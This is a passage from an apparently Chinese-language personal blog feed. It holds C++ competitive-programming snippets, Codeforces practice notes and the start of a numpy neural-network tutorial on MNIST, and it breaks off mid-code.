x));<br><span class="hljs-comment">// num to string</span><br><span class="hljs-built_in">to_string</span>();<br><span class="hljs-comment">// 回文</span><br><span class="hljs-built_in">string</span>(prefix + prefix.<span class="hljs-built_in">rbegin</span>() + (len &amp; <span class="hljs-number">1</span>), prefix.<span class="hljs-built_in">rend</span>());<br><br><span class="hljs-comment">// 通过内置string函数代替数字哈希 int + &#x27;|&#x27;</span><br>unordered_set&lt;string&gt; us;<br><span class="hljs-comment">// find 寻找第一个出现字符串的位置</span><br>code.<span class="hljs-built_in">find</span>(string, start_pos);<br></code></pre></td></tr></table></figure><h3 id="custom">custom</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// compare</span><br><span class="hljs-comment">// 注意不能小于等于</span><br><span class="hljs-built_in">sort</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt; &amp;a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt; &amp;b) &#123;<br>    <span class="hljs-keyword">if</span> (a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>]) <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] &lt; b[<span class="hljs-number">0</span>];<br>&#125;);<br><br><span class="hljs-comment">// sort greater 代表相反</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(T a, T b)</span> </span>&#123;<br>    <br>&#125;<br><br><span class="hljs-comment">// queue</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">cmp</span>&#123;<br>     <span class="hljs-comment">// bool operator()</span><br>     <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">const</span> pis &amp;a, <span class="hljs-type">const</span> pis &amp;b)</span> </span>&#123;<br>         <span class="hljs-comment">//...</span><br>     &#125;<br>&#125;<br><br><span class="hljs-comment">// cmp as function/lambda</span><br>priority_queue&lt;Foo, vector&lt;Foo&gt;, <span class="hljs-keyword">decltype</span>(cmp)&gt; <span class="hljs-built_in">que</span>(cmp);<br><span class="hljs-comment">// cmp as class</span><br>priority_queue&lt;Foo, vector&lt;Foo&gt;, Compare&gt; pq;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">myHash</span>&#123;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(Cell <span class="hljs-type">const</span>&amp; s)</span> <span class="hljs-type">const</span>  </span>&#123;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">size_t</span>) (s.x * <span class="hljs-number">0x1f1f1f1f</span>) ^ s.y;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// this is const</span><br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-type">const</span> Pos&amp; otherPos) <span class="hljs-type">const</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;row == otherPos.row &amp;&amp; <span class="hljs-keyword">this</span>-&gt;col == otherPos.col) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="io">I/O</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// getline</span><br><span class="hljs-comment">// !getline 前还有一个换行符</span><br>cin.<span class="hljs-built_in">get</span>();<br>string str;<br><span class="hljs-built_in">getline</span>(cin,str);<br><br><span class="hljs-comment">// 不定长</span><br><span class="hljs-keyword">if</span> (cin.<span class="hljs-built_in">get</span>() == <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-keyword">break</span>;<br><br><span class="hljs-comment">// 提取信息</span><br><span class="hljs-built_in">sscanf</span>(str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;%d is the root&quot;</span>, &amp;y);<br>    <br><span class="hljs-comment">// 输出</span><br><span class="hljs-comment">// 面对不能多余打印的内容 - 提前存储 - 后打印 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%05d\n&quot;</span>, val);<br><span class="hljs-comment">// 最少的总宽度 x2.12 + 展示符号</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%+05.2f\n&quot;</span>, val);<br><br><span class="hljs-comment">// conditional cout</span><br>cout &lt;&lt; x == <span class="hljs-number">1</span> ? <span class="hljs-string">&quot;a&quot;</span> : <span class="hljs-string">&quot;b&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">// string literal 索引 \n\0 (\0是默认的一位)</span><br>cout &lt;&lt; a[i] &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i == N - <span class="hljs-number">1</span>];<br><br><span class="hljs-comment">// interactive </span><br><span class="hljs-comment">// [] 为正则，表示出\n外的字符</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]s&quot;</span>, str);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>        <span class="hljs-comment">// fflush(stdin);</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="内存分析">内存分析</h3><p>使用l r代替新增的数组 LCA</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">node* <span class="hljs-title">build</span><span class="hljs-params">(vi &amp;a, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt; r) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    node *head = <span class="hljs-keyword">new</span> <span class="hljs-built_in">node</span>(a[l]);<br>    <span class="hljs-type">int</span> ml = r + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">rep</span> (i, l + <span class="hljs-number">1</span>, r + <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] &gt; a[<span class="hljs-number">0</span>]) &#123;<br>            ml = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    head-&gt;left = <span class="hljs-built_in">build</span>(a, l + <span class="hljs-number">1</span>, ml - <span class="hljs-number">1</span>);<br>    head-&gt;right = <span class="hljs-built_in">build</span>(a, ml, r);<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="时间分析">时间分析</h3><p>总的合并次数 + 遍历次数</p><p>复杂度分析 - 随机变量的估计 ? random</p><p>200ms 3*n 三倍时间 == 超时</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 10**9</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;chrono&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std::chrono;<br>    <span class="hljs-keyword">auto</span> start = high_resolution_clock::<span class="hljs-built_in">now</span>();<br><span class="hljs-comment">// 10**9 视为1s</span><br><span class="hljs-comment">// ull 2s-6s(个人pc), oj 1-2s</span><br><span class="hljs-comment">// 10**18 = 10**9s; 3600s = 1h ...</span><br>    <span class="hljs-keyword">for</span> (ull i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>        res++;<br>    &#125;<br>    cout &lt;&lt; res &lt;&lt; endl;<br>    <span class="hljs-keyword">auto</span> stop = high_resolution_clock::<span class="hljs-built_in">now</span>();<br>    <span class="hljs-keyword">auto</span> duration = <span class="hljs-built_in">duration_cast</span>&lt;microseconds&gt;(stop - start);<br> <br>    cout &lt;&lt; <span class="hljs-string">&quot;Time taken by function: &quot;</span><br>         &lt;&lt; duration.<span class="hljs-built_in">count</span>() &lt;&lt; <span class="hljs-string">&quot; microseconds&quot;</span> &lt;&lt; endl;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Algorithm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习记录</title>
    <link href="/2022/06/29/alrecord/"/>
    <url>/2022/06/29/alrecord/</url>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1848">Codeforces Round 885(Div. 2)</a></p><p>1848-c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// TLE</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gett</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (a == b) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (a &gt; b) &#123;<br>        <span class="hljs-type">int</span> x = a / b;<br>        <span class="hljs-comment">// 最后会MOD3 没有必要加上</span><br>        ans += (x / <span class="hljs-number">2</span>) * <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 自以为多考虑了一步，实际使得下一次跳转的步长减少了</span><br>            <span class="hljs-comment">// GCD证明一般考虑下界 即两次操作后，一定有 b -&gt; b / 2</span><br>            <span class="hljs-comment">// 分类讨论较为繁琐，一般记住特定的形式</span><br>            <span class="hljs-keyword">return</span> ans + <span class="hljs-number">2</span> + <span class="hljs-built_in">gett</span>(a % b, b - a % b);    <br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> ans + <span class="hljs-built_in">gett</span>(a % b, b);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &lt; b) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + <span class="hljs-built_in">gett</span>(b, b - a);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gett</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (a == b) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (a &gt; b) &#123;<br>        <span class="hljs-type">int</span> x = a / b;<br>        ans += x / <span class="hljs-number">2</span> * <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> ans + <span class="hljs-number">1</span> + <span class="hljs-built_in">gett</span>(b, a % b);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> ans + <span class="hljs-built_in">gett</span>(a % b, b);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &lt; b) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + <span class="hljs-built_in">gett</span>(b, b - a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://codeforces.com/contest/1853">Codeforces Round 887(Div. 2)</a></p><p>1853-c</p><p><a href="https://codeforces.com/contest/1855">Codeforces Round 889(Div. 2)</a></p><p>1855-b</p><p>1855-c2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 一共只有31次操作机会</span><br><br><span class="hljs-comment">// 若将数组全部转换为大于0 / 小于0 需要19次操作</span><br><br><span class="hljs-comment">// 每次可以使得a[i] += a[j]，视为一次操作，目的是使得数组单调增 / 单调减</span><br><br><span class="hljs-comment">// 贪心：使得后面的尽量大，前面的尽量小</span><br><span class="hljs-comment">// 需要改变的是差值，而不是绝对值的大小</span><br><span class="hljs-comment">// 拆分问题：两两讨论 a[i] a[i + 1]（前提不能改变a[i]）</span><br><span class="hljs-comment">// 假定所有a[i]同号，需要消耗19次操作机会</span><br><span class="hljs-comment">// 将a[i]转换为同号的情况 </span><br><span class="hljs-comment">// S1：将absmx加到对应符号的值上，需要消耗19次 不符合31次的条件 </span><br><span class="hljs-comment">// ！！！可以解决正数11 负数9时的问题</span><br><span class="hljs-comment">// S2：设正数为多数，使得pmx变为absmx</span><br><span class="hljs-comment">// 倍增需要5次</span><br><span class="hljs-comment">// 当正数11 负数9时，9 + 5 = 14</span><br><span class="hljs-comment">// 需要减少两次</span><br><span class="hljs-comment">// 无法分类讨论 x</span><br><br><span class="hljs-comment">// ！有特殊情况使得S1不成立，却没有借助S1排除一部分情况。</span><br><span class="hljs-comment">// ！S2不能解决的反例不一定要提出一个改善的S2，S1能解决。</span><br><span class="hljs-comment">// 舍弃S1，认为S2需要改进才能解决问题，导致无法解决问题。  </span><br><br><span class="hljs-comment">// 当同时需要索引和值时的代码写法</span><br>mxid = <span class="hljs-built_in">max_element</span>(a.<span class="hljs-built_in">begin</span>(), a.<span class="hljs-built_in">end</span>()) - a.<span class="hljs-built_in">begin</span>(), mx = a[mxid];<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Algorith</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习基础</title>
    <link href="/2022/05/03/ml/"/>
    <url>/2022/05/03/ml/</url>
    
    <content type="html"><![CDATA[<h1 id="实验概述">实验概述</h1><ol type="1"><li>基于帖子<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="https://towardsdatascience.com/lets-code-a-neural-network-in-plain-numpy-ae7e74410795">[1]</span></a></sup>的代码与框架，通过pythonnumpy库构建基本的神经网络模型，在基本结构的基础上增加了mini-batch梯度下降，针对多标签问题，使用softmax作为输出层的激活函数，crossentropy定义损失函数。</li><li>使用MNIST数据集检验建立的模型，设立合适的神经网络层数，batch个数，学习率，epoch等参数，限于算力，只尝试了较为小的模型，并通过训练测试准确率曲线观察训练效果。</li><li>基于官方文档<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="https://github.com/pytorch/examples/blob/main/mnist/main.py">[2]</span></a></sup>的代码与框架，通过pytorch建立CNN模型，与简单神经网络做比对，观察效果。</li></ol><h1 id="基本神经网络">基本神经网络</h1><h2 id="基本结构">基本结构</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 基本结构</span><br>NN_ARCHITECTURE = [<br>    <span class="hljs-comment"># 输入-&gt;隐藏层1的权重</span><br>    &#123;<span class="hljs-string">&quot;input_dim&quot;</span>: <span class="hljs-number">784</span>, <span class="hljs-string">&quot;output_dim&quot;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&quot;activation&quot;</span>: <span class="hljs-string">&quot;relu&quot;</span>&#125;,<br>    <span class="hljs-comment"># 隐藏层1-&gt;隐藏层2的权重</span><br>    &#123;<span class="hljs-string">&quot;input_dim&quot;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&quot;output_dim&quot;</span>: <span class="hljs-number">150</span>, <span class="hljs-string">&quot;activation&quot;</span>: <span class="hljs-string">&quot;relu&quot;</span>&#125;,<br>    <span class="hljs-comment"># 隐藏层2-&gt;输出的权重</span><br>    &#123;<span class="hljs-string">&quot;input_dim&quot;</span>: <span class="hljs-number">150</span>, <span class="hljs-string">&quot;output_dim&quot;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&quot;activation&quot;</span>: <span class="hljs-string">&quot;softmax&quot;</span>&#125;,<br>    <span class="hljs-comment"># &#123;&quot;input_dim&quot;: 50, &quot;output_dim&quot;: 10, &quot;activation&quot;: &quot;softmax&quot;&#125;</span><br>]<br></code></pre></td></tr></table></figure><h2 id="激活函数">激活函数</h2><p>激活函数为神经网络增添了非线性，能够拟合更复杂的模型。且选择合适的激活函数可以防止梯度爆炸与梯度消失，本文使用relu作为默认的激活函数。</p><p><img src="/images/common%20activation%20function.png" alt="常见的激活函数" style="zoom: 67%;" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sigmoid</span>(<span class="hljs-params">Z</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>/(<span class="hljs-number">1</span>+np.exp(-Z))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">relu</span>(<span class="hljs-params">Z</span>):<br>    <span class="hljs-keyword">return</span> np.maximum(<span class="hljs-number">0</span>,Z)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sigmoid_backward</span>(<span class="hljs-params">dA, Z</span>):<br>    sig = sigmoid(Z)<br>    <span class="hljs-keyword">return</span> dA * sig * (<span class="hljs-number">1</span> - sig)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">relu_backward</span>(<span class="hljs-params">dA, Z</span>):<br>    dZ = np.array(dA, copy = <span class="hljs-literal">True</span>)<br>    dZ[Z &lt;= <span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> dZ<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax</span>(<span class="hljs-params">x</span>):<br>    exp_x = np.exp(x - np.<span class="hljs-built_in">max</span>(x, axis=<span class="hljs-number">0</span>, keepdims=<span class="hljs-literal">True</span>))<br>    <span class="hljs-keyword">return</span> exp_x / np.<span class="hljs-built_in">sum</span>(exp_x, axis=<span class="hljs-number">0</span>, keepdims=<span class="hljs-literal">True</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax_backward</span>(<span class="hljs-params">y_hat, y</span>):<br>    m = y.shape[<span class="hljs-number">0</span>]<br>    dx = y_hat.T.copy()<br>    dx[<span class="hljs-built_in">range</span>(m), y.T] -= <span class="hljs-number">1</span><br>    dx /= m<br>    <span class="hljs-keyword">return</span> dx.T<br></code></pre></td></tr></table></figure><h2 id="前向传播">前向传播</h2><p>设每一层的输出为<span class="math inline">\(a^l\)</span>, 则有<spanclass="math inline">\(z^{l} = W^l \cdot a^{l - 1} + b^{l}, a^{l} =g^{l}(z^{l})\)</span>, 如下图所示。</p><p><img src="/images/matrices%20in%20a%20forward%20step.png" alt="前向传播矩阵" style="zoom: 80%;" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 代码实现</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">single_layer_forward_propagation</span>(<span class="hljs-params">A_prev, W_curr, b_curr, activation=<span class="hljs-string">&quot;relu&quot;</span></span>):<br>    <br>    <span class="hljs-comment"># np.dot即为矩阵乘法</span><br>    Z_curr = np.dot(W_curr, A_prev) + b_curr<br>    <br>    <span class="hljs-comment"># selection of activation function</span><br>    <span class="hljs-keyword">if</span> activation == <span class="hljs-string">&quot;relu&quot;</span>:<br>        activation_func = relu<br>    <span class="hljs-keyword">elif</span> activation == <span class="hljs-string">&quot;sigmoid&quot;</span>:<br>        activation_func = sigmoid<br>    <span class="hljs-keyword">elif</span> activation == <span class="hljs-string">&quot;softmax&quot;</span>:<br>        activation_func = softmax<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Non-supported activation function&#x27;</span>)<br>        <br>    <span class="hljs-keyword">return</span> activation_func(Z_curr), Z_curr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">full_forward_propagation</span>(<span class="hljs-params">X, params_values, nn_architecture</span>):<br>    <span class="hljs-comment"># 保留缓存</span><br>    memory = &#123;&#125;<br>    <span class="hljs-comment"># X vector is the activation for layer 0 </span><br>    A_curr = X<br>    <br>    <span class="hljs-keyword">for</span> idx, layer <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(nn_architecture):<br><br>        layer_idx = idx + <span class="hljs-number">1</span><br>        <br>        <span class="hljs-comment"># 上一层的输入</span><br>        A_prev = A_curr<br>        <br>        <span class="hljs-comment"># 当前使用的激活函数r</span><br>        activ_function_curr = layer[<span class="hljs-string">&quot;activation&quot;</span>]<br>        <br>        <span class="hljs-comment"># 当前的W, b</span><br>        W_curr = params_values[<span class="hljs-string">&quot;W&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx)]<br>        b_curr = params_values[<span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx)]<br>        <br>        <span class="hljs-comment"># 计算当前的A, Z</span><br>        A_curr, Z_curr = single_layer_forward_propagation(A_prev, W_curr, b_curr, activ_function_curr)<br>        <br>        <span class="hljs-comment"># 保存用作后向传播</span><br>        memory[<span class="hljs-string">&quot;A&quot;</span> + <span class="hljs-built_in">str</span>(idx)] = A_prev<br>        memory[<span class="hljs-string">&quot;Z&quot;</span> + <span class="hljs-built_in">str</span>(layer_idx)] = Z_curr<br>       <br>    <span class="hljs-keyword">return</span> A_curr, memory<br></code></pre></td></tr></table></figure><h2 id="损失函数">损失函数</h2><p>定义损失函数，损失函数越小，代表预测值越精准，对于回归问题，可以使用RMSE作为损失函数，而对于分类问题，采用sigmoid+binary_cross_entropy的方式或log_softmax方式，考虑到softmax方法考虑到了每个元素之间的关系，在多标签问题有一定的优势，本文采用soft_max结合Cross_Entropy_Loss的方式。</p><p>公式证明:</p><p><img src="/images/formulas.png" alt="损失函数求导公式" style="zoom:67%;" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax_backward</span>(<span class="hljs-params">y_hat, y</span>):<br>    m = y.shape[<span class="hljs-number">0</span>]<br>    dx = y_hat.T.copy()<br>    dx[<span class="hljs-built_in">range</span>(m), y.T] -= <span class="hljs-number">1</span><br>    dx /= m<br>    <span class="hljs-keyword">return</span> dx.T<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cross_entropy_loss</span>(<span class="hljs-params">y_hat,y</span>):<br>    m = y.shape[<span class="hljs-number">0</span>]<br>    log_likelihood = -np.log(y_hat.T[<span class="hljs-built_in">range</span>(m),y.T])<br>    loss = np.<span 